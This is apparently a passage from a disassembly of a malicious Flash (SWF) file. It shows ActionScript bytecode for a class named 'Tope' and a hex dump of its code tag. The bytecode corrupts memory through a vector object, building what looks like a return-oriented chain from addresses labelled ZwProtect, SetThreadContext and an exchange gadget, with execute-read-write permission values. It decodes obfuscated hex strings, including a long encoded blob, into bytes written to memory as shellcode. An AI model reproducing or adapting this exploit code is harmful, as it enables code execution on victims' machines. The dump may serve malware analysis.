       1301 getproperty   	private::m_longArrBase //nameIndex = 30
       1303 pushshort     	248
       1306 add           	
       1307 convert_u     	
       1308 setlocal      	6
       1310 getlocal0     	
       1311 getproperty   	private::m_longArrBase //nameIndex = 30
       1313 convert_u     	
       1314 setlocal      	12
       1316 getlocal0     	
       1317 getproperty   	private::m_ZwProtectAddr //nameIndex = 36
       1319 convert_u     	
       1320 setlocal      	10
       1322 getlocal      	6
       1324 coerce_a      	
       1325 setlocal      	41
       1327 getlocal0     	
       1328 getproperty   	s //nameIndex = 23
       1330 getlocal      	28
       1332 getproperty   	null //nameIndex = 75
       1334 getlocal      	6
       1336 getlocal      	12
       1338 subtract      	
       1339 pushbyte      	4
       1341 divide        	
       1342 pushbyte      	2
       1344 subtract      	
       1345 pushbyte      	4
       1347 subtract      	
       1348 getlocal      	41
       1350 pushdouble    	4294963200
       1352 bitand        	
       1353 setproperty   	null //nameIndex = 75
       1355 getlocal0     	
       1356 getproperty   	s //nameIndex = 23
       1358 getlocal      	28
       1360 getproperty   	null //nameIndex = 75
       1362 getlocal      	6
       1364 getlocal      	12
       1366 subtract      	
       1367 pushbyte      	4
       1369 divide        	
       1370 decrement     	
       1371 pushbyte      	4
       1373 subtract      	
       1374 pushshort     	12288
       1377 setproperty   	null //nameIndex = 75
       1379 getlocal0     	
       1380 getproperty   	s //nameIndex = 23
       1382 getlocal      	28
       1384 getproperty   	null //nameIndex = 75
       1386 getlocal      	6
       1388 getlocal      	12
       1390 subtract      	
       1391 pushbyte      	4
       1393 divide        	
       1394 getlocal      	10
       1396 setproperty   	null //nameIndex = 75
       1398 getlocal0     	
       1399 getproperty   	s //nameIndex = 23
       1401 getlocal      	28
       1403 getproperty   	null //nameIndex = 75
       1405 getlocal      	6
       1407 getlocal      	12
       1409 subtract      	
       1410 pushbyte      	4
       1412 divide        	
       1413 pushbyte      	1
       1415 add           	
       1416 getlocal      	41
       1418 pushbyte      	28
       1420 add           	
       1421 setproperty   	null //nameIndex = 75
       1423 getlocal0     	
       1424 getproperty   	s //nameIndex = 23
       1426 getlocal      	28
       1428 getproperty   	null //nameIndex = 75
       1430 getlocal      	6
       1432 getlocal      	12
       1434 subtract      	
       1435 pushbyte      	4
       1437 divide        	
       1438 pushbyte      	2
       1440 add           	
       1441 pushdouble    	4294967295
       1443 setproperty   	null //nameIndex = 75
       1445 getlocal0     	
       1446 getproperty   	s //nameIndex = 23
       1448 getlocal      	28
       1450 getproperty   	null //nameIndex = 75
       1452 getlocal      	6
       1454 getlocal      	12
       1456 subtract      	
       1457 pushbyte      	4
       1459 divide        	
       1460 pushbyte      	3
       1462 add           	
       1463 getlocal      	6
       1465 pushbyte      	24
       1467 subtract      	
       1468 setproperty   	null //nameIndex = 75
       1470 getlocal0     	
       1471 getproperty   	s //nameIndex = 23
       1473 getlocal      	28
       1475 getproperty   	null //nameIndex = 75
       1477 getlocal      	6
       1479 getlocal      	12
       1481 subtract      	
       1482 pushbyte      	4
       1484 divide        	
       1485 pushbyte      	4
       1487 add           	
       1488 getlocal      	6
       1490 pushbyte      	20
       1492 subtract      	
       1493 setproperty   	null //nameIndex = 75
       1495 getlocal0     	
       1496 getproperty   	s //nameIndex = 23
       1498 getlocal      	28
       1500 getproperty   	null //nameIndex = 75
       1502 getlocal      	6
       1504 getlocal      	12
       1506 subtract      	
       1507 pushbyte      	4
       1509 divide        	
       1510 pushbyte      	5
       1512 add           	
       1513 pushbyte      	64
       1515 setproperty   	null //nameIndex = 75
       1517 getlocal0     	
       1518 getproperty   	s //nameIndex = 23
       1520 getlocal      	28
       1522 getproperty   	null //nameIndex = 75
       1524 getlocal      	6
       1526 getlocal      	12
       1528 subtract      	
       1529 pushbyte      	4
       1531 divide        	
       1532 pushbyte      	6
       1534 add           	
       1535 getlocal      	6
       1537 pushbyte      	28
       1539 subtract      	
       1540 setproperty   	null //nameIndex = 75
       1542 getlocal0     	
       1543 getproperty   	s //nameIndex = 23
       1545 getlocal      	28
       1547 getproperty   	null //nameIndex = 75
       1549 getlocal      	41
       1551 getlocal      	12
       1553 subtract      	
       1554 pushbyte      	4
       1556 divide        	
       1557 pushbyte      	7
       1559 add           	
       1560 pushint       	402664841	// 0x18002d89
       1562 setproperty   	null //nameIndex = 75
       1564 getlocal0     	
       1565 getproperty   	s //nameIndex = 23
       1567 getlocal      	28
       1569 getproperty   	null //nameIndex = 75
       1571 getlocal      	41
       1573 getlocal      	12
       1575 subtract      	
       1576 pushbyte      	4
       1578 divide        	
       1579 pushbyte      	8
       1581 add           	
       1582 pushdouble    	3096451096
       1584 setproperty   	null //nameIndex = 75
       1586 getlocal0     	
       1587 getproperty   	s //nameIndex = 23
       1589 getlocal      	28
       1591 getproperty   	null //nameIndex = 75
       1593 getlocal      	41
       1595 getlocal      	12
       1597 subtract      	
       1598 pushbyte      	4
       1600 divide        	
       1601 pushbyte      	9
       1603 add           	
       1604 getlocal      	9
       1606 setproperty   	null //nameIndex = 75
       1608 getlocal0     	
       1609 getproperty   	s //nameIndex = 23
       1611 getlocal      	28
       1613 getproperty   	null //nameIndex = 75
       1615 getlocal      	41
       1617 getlocal      	12
       1619 subtract      	
       1620 pushbyte      	4
       1622 divide        	
       1623 pushbyte      	10
       1625 add           	
       1626 pushint       	13078672	// 0xc79090
       1628 setproperty   	null //nameIndex = 75
       1630 getlocal0     	
       1631 getproperty   	s //nameIndex = 23
       1633 getlocal      	28
       1635 getproperty   	null //nameIndex = 75
       1637 getlocal      	41
       1639 getlocal      	12
       1641 subtract      	
       1642 pushbyte      	4
       1644 divide        	
       1645 pushbyte      	11
       1647 add           	
       1648 getlocal      	7
       1650 setproperty   	null //nameIndex = 75
       1652 getlocal0     	
       1653 getproperty   	s //nameIndex = 23
       1655 getlocal      	28
       1657 getproperty   	null //nameIndex = 75
       1659 getlocal      	41
       1661 getlocal      	12
       1663 subtract      	
       1664 pushbyte      	4
       1666 divide        	
       1667 pushbyte      	12
       1669 add           	
       1670 pushdouble    	3096481936
       1672 setproperty   	null //nameIndex = 75
       1674 getlocal0     	
       1675 getproperty   	s //nameIndex = 23
       1677 getlocal      	28
       1679 getproperty   	null //nameIndex = 75
       1681 getlocal      	41
       1683 getlocal      	12
       1685 subtract      	
       1686 pushbyte      	4
       1688 divide        	
       1689 pushbyte      	13
       1691 add           	
       1692 getlocal0     	
       1693 getproperty   	private::m_longArrBase //nameIndex = 30
       1695 pushbyte      	8
       1697 subtract      	
       1698 setproperty   	null //nameIndex = 75
       1700 getlocal0     	
       1701 getproperty   	s //nameIndex = 23
       1703 getlocal      	28
       1705 getproperty   	null //nameIndex = 75
       1707 getlocal      	41
       1709 getlocal      	12
       1711 subtract      	
       1712 pushbyte      	4
       1714 divide        	
       1715 pushbyte      	14
       1717 add           	
       1718 pushint       	13078672	// 0xc79090
       1720 setproperty   	null //nameIndex = 75
       1722 getlocal0     	
       1723 getproperty   	s //nameIndex = 23
       1725 getlocal      	28
       1727 getproperty   	null //nameIndex = 75
       1729 getlocal      	41
       1731 getlocal      	12
       1733 subtract      	
       1734 pushbyte      	4
       1736 divide        	
       1737 pushbyte      	15
       1739 add           	
       1740 getlocal0     	
       1741 getproperty   	m_rawLen //nameIndex = 44
       1743 setproperty   	null //nameIndex = 75
       1745 getlocal0     	
       1746 getproperty   	s //nameIndex = 23
       1748 getlocal      	28
       1750 getproperty   	null //nameIndex = 75
       1752 getlocal      	41
       1754 getlocal      	12
       1756 subtract      	
       1757 pushbyte      	4
       1759 divide        	
       1760 pushbyte      	16
       1762 add           	
       1763 pushdouble    	3968066955
       1765 setproperty   	null //nameIndex = 75
       1767 getlocal0     	
       1768 getproperty   	s //nameIndex = 23
       1770 getlocal      	28
       1772 getproperty   	null //nameIndex = 75
       1774 getlocal      	41
       1776 getlocal      	12
       1778 subtract      	
       1779 pushbyte      	4
       1781 divide        	
       1782 pushbyte      	17
       1784 add           	
       1785 pushint       	753635372	// 0x2ceb902c
       1787 setproperty   	null //nameIndex = 75
       1789 getlocal0     	
       1790 getproperty   	s //nameIndex = 23
       1792 getlocal      	28
       1794 getproperty   	null //nameIndex = 75
       1796 getlocal      	41
       1798 getlocal      	12
       1800 subtract      	
       1801 pushbyte      	4
       1803 divide        	
       1804 pushbyte      	17
       1806 add           	
       1807 pushint       	753635372	// 0x2ceb902c
       1809 setproperty   	null //nameIndex = 75
       1811 getlocal0     	
       1812 getproperty   	s //nameIndex = 23
       1814 getlocal      	28
       1816 getproperty   	null //nameIndex = 75
       1818 getlocal      	6
       1820 getlocal      	12
       1822 subtract      	
       1823 pushbyte      	4
       1825 divide        	
       1826 pushbyte      	28
       1828 add           	
       1829 getlocal0     	
       1830 getproperty   	private::m_xchgInstAddr //nameIndex = 37
       1832 setproperty   	null //nameIndex = 75
       1834 pushbyte      	29
       1836 convert_u     	
       1837 setlocal      	42
       1839 findpropstrict	flash.utils::ByteArray //nameIndex = 8
       1841 constructprop 	flash.utils::ByteArray (0) //nameIndex = 8
       1844 coerce_a      	
       1845 dup           	
       1846 setlocal      	43
       1848 getlex        	flash.utils::Endian //nameIndex = 91
       1850 getproperty   	LITTLE_ENDIAN //nameIndex = 92
       1852 setproperty   	endian //nameIndex = 100
       1854 getlocal      	43
       1856 getlocal0     	
       1857 pushstring    	"630ed5495eaad7cd8b52d42b60f0757f103583276a31f7cbee2201fd80f167"
       1860 callproperty  	private::decode (1) //nameIndex = 51
       1863 callpropvoid  	writeBytes (1) //nameIndex = 104
       1866 getlocal      	43
       1868 getlocal0     	
       1869 getproperty   	private::m_SetThreadContext //nameIndex = 38
       1871 callpropvoid  	writeInt (1) //nameIndex = 105
       1874 getlocal      	43
       1876 getlocal0     	
       1877 pushstring    	"cb5fb86dbbafd70ad04504"
       1880 callproperty  	private::decode (1) //nameIndex = 51
       1883 callpropvoid  	writeBytes (1) //nameIndex = 104
       1886 getlocal      	43
       1888 getlocal0     	
       1889 getlocal0     	
       1890 getproperty   	private::m_dump7 //nameIndex = 18
       1892 callproperty  	private::decode (1) //nameIndex = 51
       1895 callpropvoid  	writeBytes (1) //nameIndex = 104
       1898 getlocal0     	
       1899 getlocal      	41
       1901 getlocal      	42
       1903 pushbyte      	4
       1905 multiply      	
       1906 add           	
       1907 getlocal      	43
       1909 callpropvoid  	private::writeBytes (2) //nameIndex = 58
       1912 getlocal0     	
       1913 getlocal      	9
       1915 getlocal      	6
       1917 callpropvoid  	private::write32 (2) //nameIndex = 54
       1920 getlocal0     	
       1921 getproperty   	private::snd //nameIndex = 16
       1923 callpropvoid  	toString (0) //nameIndex = 85
       1926 getlocal0     	
       1927 pushint       	65535	// 0xffff
       1929 setproperty   	m_status //nameIndex = 29
       1931 getlocal0     	
       1932 callpropvoid  	free (0) //nameIndex = 49
       
       L44: 
       1935 returnvoid    	
     }

     static function Tope$cinit():*	/* disp_id=0 method_id=0 nameIndex = 0 */
     {
       // local_count=1 max_scope=1 max_stack=1 code_len=3
       // method position=5305 code position=5710
       0    getlocal0     	
       1    pushscope     	
       2    returnvoid    	
     }
   }

   function script0$init():*	/* disp_id=0 method_id=24 nameIndex = 0 */
   {
     // local_count=1 max_scope=7 max_stack=2 code_len=35
     // method position=5433 code position=11447
     0      getlocal0     	
     1      pushscope     	
     2      getscopeobject	0
     4      getlex        	Object //nameIndex = 13
     6      pushscope     	
     7      getlex        	flash.events::EventDispatcher //nameIndex = 106
     9      pushscope     	
     10     getlex        	flash.display::DisplayObject //nameIndex = 107
     12     pushscope     	
     13     getlex        	flash.display::InteractiveObject //nameIndex = 108
     15     pushscope     	
     16     getlex        	flash.display::DisplayObjectContainer //nameIndex = 109
     18     pushscope     	
     19     getlex        	flash.display::Sprite //nameIndex = 11
     21     pushscope     	
     22     getlex        	flash.display::Sprite //nameIndex = 11
     24     newclass      	Tope
     26     popscope      	
     27     popscope      	
     28     popscope      	
     29     popscope      	
     30     popscope      	
     31     popscope      	
     32     initproperty  	Tope //nameIndex = 10
     34     returnvoid    	
   }

</DoABC2>

// ------------------
// DoABC Hex:
// ------------------

bf 14 e8 2c 00 00 01 00 00 00 66 72 61 6d 65 31 		| ***,******frame1 |
00 10 00 2e 00 15 e8 07 80 20 00 ff ff 03 80 c0 		| ***.***** ****** |
e0 c0 01 c1 82 85 8a 04 c2 84 89 92 04 c6 8c 99 		| **************** |
b2 04 f1 83 85 8a 04 80 80 04 80 80 08 80 80 80 		| **************** |
80 04 ff ff ff 07 80 e0 e0 c0 01 88 e0 e0 c0 01 		| **************** |
f0 ff ff ff 03 94 87 03 89 db 80 c0 01 90 a1 9e 		| **************** |
06 ac a0 ae e7 02 00 0c 00 00 00 00 20 16 f6 40 		| ************ **@ |
00 00 00 00 e0 ff ef 41 00 00 e0 ff ff ff ef 41 		| *******A*******A |
00 00 80 ff ff ff ef 41 00 00 00 e0 ff ff ef 41 		| *******A*******A |
00 00 e0 1f e0 ff ef 41 00 00 e0 ff 1f e0 ef 41 		| *******A*******A |
00 00 00 00 fe ff ef 41 00 00 00 03 03 12 e7 41 		| *******A*******A |
00 00 00 12 12 12 e7 41 00 00 60 b1 7c 90 ed 41 		| *******A**`*|**A |
8a 01 00 07 42 6f 6f 6c 65 61 6e 04 76 6f 69 64 		| ****Boolean*void |
04 75 69 6e 74 0b 5f 5f 41 53 33 5f 5f 2e 76 65 		| *uint*__AS3__.ve |
63 06 56 65 63 74 6f 72 03 69 6e 74 06 53 74 72 		| c*Vector*int*Str |
69 6e 67 0b 66 6c 61 73 68 2e 75 74 69 6c 73 09 		| ing*flash.utils* |
42 79 74 65 41 72 72 61 79 0c 66 6c 61 73 68 2e 		| ByteArray*flash. |
65 76 65 6e 74 73 0a 54 69 6d 65 72 45 76 65 6e 		| events*TimerEven |
74 04 54 6f 70 65 0d 66 6c 61 73 68 2e 64 69 73 		| t*Tope*flash.dis |
70 6c 61 79 06 53 70 72 69 74 65 02 73 73 06 4f 		| play*Sprite*ss*O |
62 6a 65 63 74 05 64 65 6c 61 79 03 73 6e 64 0b 		| bject*delay*snd* |
66 6c 61 73 68 2e 6d 65 64 69 61 05 53 6f 75 6e 		| flash.media*Soun |
64 07 6d 5f 64 75 6d 70 37 92 15 35 34 36 37 65 		| d*m_dump7**5467e |
62 61 61 35 62 61 61 62 36 63 39 64 39 34 35 33 		| baa5baab6c9d9453 |
32 31 32 31 35 64 34 66 30 37 35 32 35 31 61 66 		| 21215d4f075251af |
32 37 31 37 62 33 30 63 64 65 38 35 62 64 63 65 		| 2717b30cde85bdce |
64 65 39 64 31 37 62 66 62 36 65 66 66 32 61 61 		| de9d17bfb6eff2aa |
32 35 65 39 62 33 34 61 64 37 61 31 36 37 30 61 		| 25e9b34ad7a1670a |
62 35 61 62 63 32 37 62 31 39 32 37 33 66 31 37 		| b5abc27b19273f17 |
66 31 39 37 37 36 35 31 39 36 63 30 32 39 39 62 		| f197765196c0299b |
38 34 66 31 39 30 62 38 34 38 66 31 64 33 39 65 		| 84f190b848f1d39e |
62 39 35 34 32 38 64 30 65 36 33 31 33 34 33 33 		| b95428d0e6313433 |
34 38 62 33 37 38 66 38 64 31 32 34 36 64 32 66 		| 48b378f8d1246d2f |
35 62 33 33 61 34 65 66 66 66 39 61 34 37 66 39 		| 5b33a4efff9a47f9 |
34 31 61 33 65 62 30 32 62 32 39 30 62 32 61 63 		| 41a3eb02b290b2ac |
36 37 33 32 39 38 37 66 35 36 64 38 63 34 34 32 		| 6732987f56d8c442 |
61 66 34 31 30 62 65 63 63 62 65 61 63 33 63 62 		| af410beccbeac3cb |
62 65 61 65 61 64 36 39 64 33 33 62 37 39 30 64 		| beaead69d33b790d |
30 61 38 63 33 32 33 38 31 61 65 31 31 65 34 64 		| 0a8c32381ae11e4d |
37 66 65 36 38 30 32 64 39 37 38 34 63 63 66 35 		| 7fe6802d9784ccf5 |
36 37 33 38 30 63 31 66 39 31 34 37 66 32 65 39 		| 67380c1f9147f2e9 |
35 37 37 65 30 64 30 31 65 33 39 32 62 62 33 36 		| 577e0d01e392bb36 |
64 32 34 32 31 39 38 37 66 39 38 31 63 36 37 34 		| d2421987f981c674 |
35 61 62 62 63 35 61 35 37 66 61 34 64 35 66 33 		| 5abbc5a57fa4d5f3 |
33 30 34 37 63 39 35 66 61 39 39 38 38 32 62 32 		| 3047c95fa99882b2 |
33 66 64 36 38 62 36 38 62 32 32 66 66 32 35 31 		| 3fd68b68b22ff251 |
34 34 39 37 38 66 66 33 38 34 39 39 37 38 35 61 		| 44978ff38499785a |
30 62 64 66 33 37 36 33 35 64 62 66 64 64 66 64 		| 0bdf37635dbfddfd |
33 38 32 36 34 64 63 63 33 63 30 64 64 35 66 32 		| 38264dcc3c0dd5f2 |
34 38 64 63 32 36 66 64 39 37 66 62 66 38 31 31 		| 48dc26fd97fbf811 |
66 35 33 65 64 62 62 37 38 31 63 36 35 37 39 32 		| f53edbb781c65792 |
38 61 36 65 61 38 33 62 39 34 32 30 61 31 33 39 		| 8a6ea83b9420a139 |
64 33 31 66 38 34 33 37 66 66 39 38 63 36 36 34 		| d31f8437ff98c664 |
30 37 62 39 36 61 63 64 39 66 63 31 37 31 64 63 		| 07b96acd9fc171dc |
61 39 64 62 31 35 31 34 32 66 31 33 37 39 62 32 		| a9db15142f1379b2 |
36 39 61 35 64 36 63 33 64 33 65 38 30 36 65 39 		| 69a5d6c3d3e806e9 |
34 61 35 65 34 34 32 62 31 62 32 66 34 65 38 62 		| 4a5e442b1b2f4e8b |
66 66 35 33 36 36 35 34 65 32 63 61 31 61 36 34 		| ff536654e2ca1a64 |
65 36 64 66 36 37 38 63 65 65 62 35 38 39 33 35 		| e6df678ceeb58935 |
32 31 39 61 37 62 32 37 36 35 30 36 38 65 62 65 		| 219a7b2765068ebe |
32 30 62 63 36 36 37 35 65 66 37 66 35 36 38 66 		| 20bc6675ef7f568f |
31 30 61 35 37 66 64 31 35 33 32 39 34 65 62 61 		| 10a57fd153294eba |
63 61 66 31 65 34 38 33 62 61 30 31 62 36 35 37 		| caf1e483ba01b657 |
66 65 34 62 39 31 65 61 30 32 35 63 62 34 34 63 		| fe4b91ea025cb44c |
36 62 35 32 38 64 61 64 64 33 61 63 34 39 38 33 		| 6b528dadd3ac4983 |
62 66 63 64 64 30 66 65 39 38 35 35 32 31 37 65 		| bfcdd0fe9855217e |
39 66 34 65 64 63 39 64 36 35 33 62 37 33 66 32 		| 9f4edc9d653b73f2 |
66 36 34 66 39 33 62 63 37 36 35 31 32 31 39 34 		| f64f93bc76512194 |
65 64 61 64 35 38 66 65 66 35 62 39 36 32 32 35 		| edad58fef5b96225 |
36 37 36 64 30 39 30 30 65 32 30 62 35 32 65 36 		| 676d0900e20b52e6 |
36 63 32 63 31 64 35 64 36 62 33 39 30 38 30 62 		| 6c2c1d5d6b39080b |
38 64 30 32 31 63 31 64 64 34 35 31 31 30 36 36 		| 8d021c1dd4511066 |
39 35 37 61 63 65 61 64 38 65 38 36 31 65 30 39 		| 957acead8e861e09 |
30 34 30 31 66 66 38 63 37 66 32 38 36 35 66 38 		| 0401ff8c7f2865f8 |
34 35 64 62 33 36 32 34 30 64 32 66 33 30 31 39 		| 45db36240d2f3019 |
34 65 37 37 35 64 62 39 38 63 38 38 33 61 31 62 		| 4e775db98c883a1b |
36 34 62 63 66 39 33 35 35 39 63 30 37 63 35 65 		| 64bcf93559c07c5e |
66 36 66 62 33 63 36 64 61 30 30 62 31 38 36 31 		| f6fb3c6da00b1861 |
34 65 36 32 32 38 37 34 37 32 39 34 63 63 62 35 		| 4e6228747294ccb5 |
34 36 63 62 38 61 62 65 32 32 62 63 39 65 31 35 		| 46cb8abe22bc9e15 |
35 38 34 61 66 63 34 61 32 34 39 37 32 33 63 65 		| 584afc4a249723ce |
35 39 34 64 39 62 63 36 64 35 65 39 30 30 64 62 		| 594d9bc6d5e900db |
31 61 64 34 61 33 62 64 34 36 31 63 66 37 61 30 		| 1ad4a3bd461cf7a0 |
36 30 37 30 30 62 63 35 38 30 63 64 32 63 64 32 		| 60700bc580cd2cd2 |
33 38 66 66 39 35 62 30 30 39 61 64 38 31 65 64 		| 38ff95b009ad81ed |
30 30 61 62 63 66 30 35 64 32 36 33 32 65 62 30 		| 00abcf05d2632eb0 |
38 39 66 36 65 37 34 38 39 38 33 39 35 35 66 36 		| 89f6e748983955f6 |
62 35 31 30 34 30 31 34 66 65 63 34 61 31 33 38 		| b5104014fec4a138 |
63 36 39 37 37 64 37 38 63 35 30 61 32 36 61 37 		| c6977d78c50a26a7 |
39 31 36 36 64 61 38 63 62 63 39 30 34 32 61 36 		| 9166da8cbc9042a6 |
66 36 30 61 34 31 33 39 64 66 66 65 65 32 39 39 		| f60a4139dffee299 |
38 63 33 33 39 30 32 62 32 35 34 33 36 37 62 34 		| 8c33902b254367b4 |
33 34 34 39 38 32 65 66 30 39 65 63 35 30 39 64 		| 344982ef09ec509d |
30 37 34 61 66 66 37 39 62 34 37 66 36 31 34 31 		| 074aff79b47f6141 |
36 32 38 61 35 33 61 37 33 64 61 39 31 39 33 61 		| 628a53a73da9193a |
64 35 32 35 39 65 34 32 33 38 37 61 65 65 61 61 		| d5259e42387aeeaa |
36 36 35 32 39 39 34 62 34 62 64 65 66 39 30 64 		| 6652994b4bdef90d |
63 37 36 34 30 39 31 65 34 37 37 39 39 33 65 63 		| c764091e477993ec |
61 33 63 62 38 32 31 34 37 35 61 30 66 31 34 35 		| a3cb821475a0f145 |
30 62 30 39 35 36 38 31 34 63 62 32 35 36 66 33 		| 0b0956814cb256f3 |
35 37 66 37 31 33 38 30 63 30 64 37 66 35 37 31 		| 57f71380c0d7f571 |
38 31 32 36 61 33 34 31 30 63 62 38 33 35 37 32 		| 8126a3410cb83572 |
31 65 63 35 62 62 66 65 63 36 39 66 35 37 62 63 		| 1ec5bbfec69f57bc |
64 35 36 64 30 34 65 65 38 61 36 30 36 64 61 34 		| d56d04ee8a606da4 |
36 61 36 35 33 62 66 34 33 62 31 32 63 30 34 32 		| 6a653bf43b12c042 |
32 35 31 31 39 35 36 65 61 37 39 63 39 38 66 63 		| 2511956ea79c98fc |
65 31 61 66 62 64 30 63 36 34 63 61 33 31 34 38 		| e1afbd0c64ca3148 |
62 36 65 34 34 32 65 34 34 33 30 31 64 33 62 62 		| b6e442e44301d3bb |
38 62 39 33 35 38 37 65 63 63 32 61 38 36 62 34 		| 8b93587ecc2a86b4 |
38 63 34 30 36 39 33 30 39 37 38 62 61 64 39 63 		| 8c406930978bad9c |
62 30 64 35 63 35 65 36 32 37 63 38 37 66 64 30 		| b0d5c5e627c87fd0 |
37 65 65 62 62 33 33 30 35 62 33 34 33 34 36 38 		| 7eebb3305b343468 |
62 64 61 35 37 65 30 30 38 33 65 35 35 38 65 33 		| bda57e0083e558e3 |
31 35 35 62 30 32 37 37 30 65 38 64 64 35 61 31 		| 155b02770e8dd5a1 |
66 32 32 61 38 31 30 61 65 63 34 35 33 62 65 32 		| f22a810aec453be2 |
34 33 30 61 32 30 30 62 32 38 64 61 38 35 39 63 		| 430a200b28da859c |
65 63 62 65 31 32 61 61 33 38 34 63 39 34 31 39 		| ecbe12aa384c9419 |
65 36 66 36 36 33 63 38 66 62 61 65 35 30 33 34 		| e6f663c8fbae5034 |
30 35 39 33 62 61 62 64 36 62 32 62 30 61 61 62 		| 0593babd6b2b0aab |
39 33 61 36 32 36 32 33 66 65 35 35 61 38 65 64 		| 93a62623fe55a8ed |
34 31 65 39 38 63 36 31 33 62 35 66 64 32 36 34 		| 41e98c613b5fd264 |
33 35 37 30 31 62 32 64 63 61 34 39 31 32 36 66 		| 35701b2dca49126f |
30 39 32 66 35 39 65 38 34 38 36 39 32 63 34 31 		| 092f59e848692c41 |
31 61 36 62 65 33 30 36 61 32 64 35 62 36 65 62 		| 1a6be306a2d5b6eb |
64 61 62 63 34 37 38 36 66 62 37 30 31 32 61 36 		| dabc4786fb7012a6 |
33 62 36 37 65 39 64 35 32 31 61 36 30 34 33 35 		| 3b67e9d521a60435 |
39 32 66 62 62 61 30 33 66 30 64 65 35 66 36 61 		| 92fbba03f0de5f6a |
64 32 32 34 39 38 64 63 63 38 66 61 32 66 63 65 		| d22498dcc8fa2fce |
39 65 35 36 66 63 66 61 34 31 31 35 63 61 61 62 		| 9e56fcfa4115caab |
33 30 39 34 37 64 32 61 38 38 32 62 65 36 62 33 		| 30947d2a882be6b3 |
33 64 33 38 66 66 63 33 65 63 35 66 31 63 32 35 		| 3d38ffc3ec5f1c25 |
39 37 62 61 37 65 66 35 37 64 36 34 30 35 38 34 		| 97ba7ef57d640584 |
61 64 30 66 66 62 62 66 31 38 31 35 38 61 61 62 		| ad0ffbbf18158aab |
65 37 36 32 38 36 34 30 36 34 65 31 35 35 30 35 		| e762864064e15505 |
34 32 33 38 61 38 65 32 65 30 39 37 32 38 35 66 		| 4238a8e2e097285f |
39 34 66 33 61 34 66 31 34 38 36 36 65 37 33 39 		| 94f3a4f14866e739 |
64 34 65 35 34 62 63 62 66 35 66 36 64 34 34 39 		| d4e54bcbf5f6d449 |
31 61 38 66 34 36 33 37 63 35 66 36 39 38 65 63 		| 1a8f4637c5f698ec |
63 34 33 66 31 31 62 35 30 33 35 34 62 38 65 38 		| c43f11b50354b8e8 |
35 63 65 34 37 39 30 62 30 36 63 37 31 34 66 34 		| 5ce4790b06c714f4 |
30 37 39 31 31 37 35 39 35 32 61 38 63 38 64 38 		| 0791175952a8c8d8 |
62 38 62 37 39 62 31 63 63 65 62 65 30 33 65 36 		| b8b79b1ccebe03e6 |
64 63 66 64 32 64 61 33 61 61 63 65 61 33 36 32 		| dcfd2da3aacea362 |
32 32 61 36 63 66 30 39 61 30 34 37 32 36 34 31 		| 22a6cf09a0472641 |
31 62 38 34 36 66 38 30 38 30 35 38 66 62 33 35 		| 1b846f808058fb35 |
61 62 64 34 30 37 33 34 39 61 34 31 65 38 33 63 		| abd407349a41e83c |
39 62 61 63 39 63 33 62 34 62 37 66 64 33 66 38 		| 9bac9c3b4b7fd3f8 |
38 64 31 31 64 34 32 39 38 34 30 62 63 30 39 65 		| 8d11d429840bc09e |
37 33 30 38 38 35 36 38 64 38 37 31 64 39 36 35 		| 73088568d871d965 |
38 35 33 33 35 32 35 38 62 30 37 36 34 66 37 62 		| 85335258b0764f7b |
38 33 30 64 38 66 39 61 39 37 36 64 33 64 38 65 		| 830d8f9a976d3d8e |
63 33 30 39 37 34 30 63 66 38 63 32 33 32 37 32 		| c309740cf8c23272 |
38 36 32 32 39 64 63 38 63 65 61 32 38 37 64 33 		| 86229dc8cea287d3 |
33 37 36 31 66 34 33 33 36 66 61 61 35 37 35 34 		| 3761f4336faa5754 |
30 32 38 63 34 61 31 33 37 31 32 37 38 64 66 33 		| 028c4a1371278df3 |
65 38 62 65 38 36 34 61 63 31 37 37 33 37 61 30 		| e8be864ac17737a0 |
66 35 36 32 63 32 38 37 64 32 62 62 66 64 64 33 		| f562c287d2bbfdd3 |
64 61 38 33 64 35 30 34 30 64 30 31 39 64 39 32 		| da83d5040d019d92 |
64 66 65 34 33 30 66 34 33 62 35 31 32 36 35 36 		| dfe430f43b512656 |
32 65 36 30 36 31 35 62 31 63 37 34 31 66 30 37 		| 2e60615b1c741f07 |
61 66 38 63 37 31 31 35 36 33 64 65 32 30 38 62 		| af8c711563de208b |
32 36 36 65 39 61 38 36 35 61 62 31 35 37 33 65 		| 266e9a865ab1573e |
37 38 30 37 32 35 62 62 63 31 36 30 66 34 64 32 		| 780725bbc160f4d2 |
32 31 36 35 62 31 32 38 62 65 65 37 31 30 38 63 		| 2165b128bee7108c |
33 30 33 38 35 39 39 30 66 39 66 39 31 35 33 65 		| 30385990f9f9153e |
39 61 34 30 32 65 64 30 39 36 31 62 32 34 30 32 		| 9a402ed0961b2402 |
36 30 64 33 64 64 37 61 62 31 34 35 38 35 34 38 		| 60d3dd7ab1458548 |
38 63 36 37 37 39 64 36 34 63 39 33 62 64 37 31 		| 8c6779d64c93bd71 |
37 36 31 35 37 61 32 31 35 32 63 34 31 34 35 35 		| 76157a2152c41455 |
35 31 38 62 35 30 30 34 61 38 34 64 66 36 61 34 		| 518b5004a84df6a4 |
65 64 31 65 63 30 62 65 63 36 63 66 31 66 62 36 		| ed1ec0bec6cf1fb6 |
30 31 38 38 62 62 65 39 33 33 38 35 63 61 61 61 		| 0188bbe93385caaa |
30 39 30 32 64 39 61 32 61 31 32 62 66 35 63 30 		| 0902d9a2a12bf5c0 |
36 63 62 63 38 35 66 39 65 39 63 64 35 32 33 65 		| 6cbc85f9e9cd523e |
62 36 65 35 34 63 63 61 33 35 61 32 34 39 38 65 		| b6e54cca35a2498e |
33 37 39 31 63 65 66 61 62 64 38 31 36 36 63 34 		| 3791cefabd8166c4 |
30 36 62 66 30 35 33 64 65 35 35 30 63 32 36 30 		| 06bf053de550c260 |
38 39 63 62 30 32 63 38 37 39 64 38 39 62 38 31 		| 89cb02c879d89b81 |
37 62 32 35 38 64 32 65 37 64 34 35 38 38 35 63 		| 7b258d2e7d45885c |
61 33 38 37 65 64 65 62 64 30 30 39 37 66 66 61 		| a387edebd0097ffa |
38 33 30 38 39 32 64 32 61 39 36 36 35 30 34 37 		| 830892d2a9665047 |
39 34 32 63 61 38 37 66 38 32 30 30 39 63 66 31 		| 942ca87f82009cf1 |
63 61 61 66 61 31 33 34 39 30 61 39 65 30 62 36 		| caafa13490a9e0b6 |
35 37 66 65 64 32 61 36 36 36 39 36 35 39 63 38 		| 57fed2a6669659c8 |
30 64 61 63 37 39 65 34 61 35 65 63 35 34 30 62 		| 0dac79e4a5ec540b |
64 36 34 35 62 35 64 35 30 33 38 38 30 62 36 34 		| d645b5d503880b64 |
